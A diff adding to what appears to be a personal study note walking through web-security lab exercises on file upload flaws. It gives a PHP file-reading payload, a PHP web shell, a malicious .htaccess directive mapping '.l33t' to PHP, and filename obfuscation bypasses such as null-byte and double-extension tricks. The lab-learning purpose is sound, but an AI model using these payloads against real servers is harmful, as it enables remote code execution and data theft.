@@ -280,4 +280,117 @@ Similarly, developers can make directory-specific configuration on IIS servers u
 Web servers use these kinds of configuration files when present, but you're not normally allowed to access them using HTTP requests. However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.
 
 ---
-> To Be Continue.......
+
+## Process.......
+
+1.  Log in and upload an image as your avatar, then go back to your account page. In Burp or ciado, go to `Proxy > HTTP` history and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater or caido replay.
+
+2. On your system, create a file called **exploit.php** containing a script for fetching the contents of Carlos's secret. For example:
+
+```PHP
+    <?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+3. Attempt to upload this script as your **avatar**. The response indicates that you are not allowed to upload files with a `.php` extension.
+4. In Burp's or caido's proxy history, find the **POST** `/my-account/avatar` request that was used to submit the file upload. In the response, notice that the headers reveal that you're talking to an **Apache server**. Send this request to Burp Repeater or caido replay.
+5. In Burp Repeater or ciado replay, go to the tab for the **POST** `/my-account/avatar request` and find the part of the body that relates to your `PHP file`. Make the following changes:
+
+    1. Change the value of the `filename` parameter to `.htaccess`.
+    2. Change the value of the `Content-Type` header to `text/plain`.
+
+    3. Replace the contents of the file (your PHP payload) with the following Apache directive: `AddType application/x-httpd-php .l33t`
+
+    4. This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
+	
+6. Send the request and observe that the file was successfully uploaded.
+	<h2 align="center"> APACHE CONFIG CHANGE</h2>
+	<img width="1919" height="1048" alt="image" src="https://github.com/user-attachments/assets/841e88e7-2f4d-45c8-8f44-6029a9f6cc67" />
+
+7. Use the back arrow in Burp Repeater or ciado replay to return to the original request for uploading your **PHP exploit**.
+8. Change the value of the **filename parameter** from `exploit.php` to `exploit.l33t` or what extension name you give it `<.name>`. Send the request again and notice that the file was uploaded successfully.
+	
+	<h2 align="center"> THEN PHP FILE UPLOAD </h2>
+	<img width="1920" height="1048" alt="image" src="https://github.com/user-attachments/assets/0c59cab8-af59-4a4d-a6ea-3d145cd59872" />
+	
+	<h2 align="center"> or </h2>
+	<img width="764" height="929" alt="image" src="https://github.com/user-attachments/assets/9265044f-9ead-4aeb-985d-bf107b86f8f2" />
+
+9. Switch to the other Repeater or replay tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.l33t` and send the request. Observe that **Carlos's secret** was returned in the response. Thanks to our malicious `.htaccess` file, the `.l33t` file was executed as if it were a `.php` file. 
+	<h2 align="center"> HERE WE GO</h2>
+	<img width="760" height="613" alt="image" src="https://github.com/user-attachments/assets/5cafa5d7-ed7b-48ce-a082-033302cf1b08" />
+
+---
+
+## Obfuscating file extensions
+
+- Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that exploit.pHp is in fact a .php file. If the code that subsequently maps the file extension to a MIME type is not case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.
+
+- You can also achieve similar results using the following techniques:
+
+	1. Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a `PHP` file or `JPG image`: `exploit.php.jpg` Add trailing characters.
+ 	2. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
+  	3. Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
+  	4. Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like **PHP** or **Java**, but the server processes the file using lower-level functions in **C/C++**, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
+  	5. Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
+
+--- 
+
+## Obfuscating file extensions - Continued
+
+- Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip .php from the following filename:
+
+```PHP
+	exploit.p.phphp
+```
+This is just a small selection of the many ways it's possible to obfuscate file extensions.
+
+--- 
+
+## PROCESS
+
+1. Log in and upload an image as your avatar, then go back to your account page.
+2. In Burp or caido, go to `Proxy > HTTP history` and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater  or caido replay.
+
+<h2 align="center">PROXY-HISTORY</h2>
+<img width="1920" height="1048" alt="Screenshot_20260208_232550" src="https://github.com/user-attachments/assets/8ed4c0ff-6c11-4371-bc9b-34dc17fbb279" align="center" />
+
+3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
+```PHP
+	<?php echo file_get_contents('/home/carlos/secret'); ?>
+					OR
+	<?php system ($_GET['cmd']); ?>
+```
+4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload `JPG` and `PNG` files.
+5. In Burp's or caido's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload. Send this to Burp Repeater or caido replay.
+6. In Burp Repeater or caido replay, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your `PHP` file. In the Content-Disposition header, change the value of the filename parameter to include a URL encoded null byte, followed by the `.jpg` extension:
+```FILENAME-CHANGING
+	filename="exploit.php%00.jpg"
+```
+
+<h2 align="center">AFTER FILE NAME CHANGE</h2>
+<img width="1537" height="980" alt="Screenshot_20260208_232536" src="https://github.com/user-attachments/assets/f7c6d9f4-86e4-4fa2-92a9-6b7511979d02" align="center" />
+
+7. Send the request and observe that the file was **successfully** uploaded. Notice that the message refers to the file as `exploit.php`, suggesting that the null byte and `.jpg` extension have been **stripped**
+
+<h2 align="center">AFTER SUCCESSFULLY UPLOAD F5 ON WEB</h2>
+<img width="1920" height="1046" alt="Screenshot_20260208_232355" src="https://github.com/user-attachments/assets/8195a235-15aa-4a8c-9df3-733257353a8b" align="center" />
+
+<h2 align="center">FOR 2ND PAYLOAD OPEN IN A NEW TAB</h2>
+<img width="1920" height="1045" alt="Screenshot_20260208_232452" src="https://github.com/user-attachments/assets/d2769d16-051a-46a9-868c-98bc8b991d72" align="center" />
+
+<h2 align="center">NOW JUST CHECK WHAT IT GIVING</h2>
+<img width="861" height="305" alt="Screenshot_20260208_232432" src="https://github.com/user-attachments/assets/0b6ddd47-e908-422e-bb0e-d59f76ba9d56" align="center" />
+
+<h2 align="center">NOW JUST ADD `?cmd=<command>` AND SEE RESULT</h2>
+<img width="901" height="329" alt="Screenshot_20260208_232411" src="https://github.com/user-attachments/assets/1081dae6-8813-467d-a8a2-57e9fc3daa12" align="center" />
+
+8. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that Carlos's secret was returned in the response.
+
+<h2 align=center>FINAL STAGE</h2>
+<img width="1538" height="984" alt="Screenshot_20260208_232514" src="https://github.com/user-attachments/assets/360b3040-4dd2-4719-83e2-68a708d82353" align="center" />
+
+9. Submit the secret to solve the lab.
+
+--- 
+
+> To Be Continuee...........
